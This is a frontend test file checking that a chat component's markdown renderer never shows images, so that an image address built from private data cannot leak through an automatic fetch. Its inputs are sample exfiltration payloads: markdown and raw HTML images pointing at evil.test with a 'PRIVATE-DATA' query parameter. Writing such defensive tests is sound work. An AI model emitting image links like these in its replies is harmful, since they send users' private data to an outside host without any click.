import { describe, it, expect } from "vitest";
import { render } from "@testing-library/react";
import MarkdownMessage from "@/features/mentor/components/MarkdownMessage";

// A rendered <img> is fetched by the browser immediately, so an image address
// built from private data would leak it with no click. Guards against that.
describe("MarkdownMessage images", () => {
  it("never renders an <img>, so nothing is requested", () => {
    const { container } = render(
      <MarkdownMessage content={"Here you go\n\n![chart](https://evil.test/p.png?d=PRIVATE-DATA)"} />,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("evil.test");
  });

  it("shows a note with the alt text instead", () => {
    const { container } = render(<MarkdownMessage content="![diagram of a JWT](https://evil.test/x.png)" />);
    expect(container.textContent).toContain("[image not shown: diagram of a JWT]");
  });

  it("does not run raw HTML image tags", () => {
    const { container } = render(<MarkdownMessage content={'<img src="https://evil.test/p.png?d=1" />'} />);
    expect(container.querySelector("img")).toBeNull();
  });

  it("still renders ordinary links, which need a click to do anything", () => {
    const { container } = render(<MarkdownMessage content="[docs](https://example.com)" />);
    const link = container.querySelector("a");
    expect(link?.getAttribute("href")).toBe("https://example.com");
    expect(link?.getAttribute("rel")).toContain("noopener");
  });
});
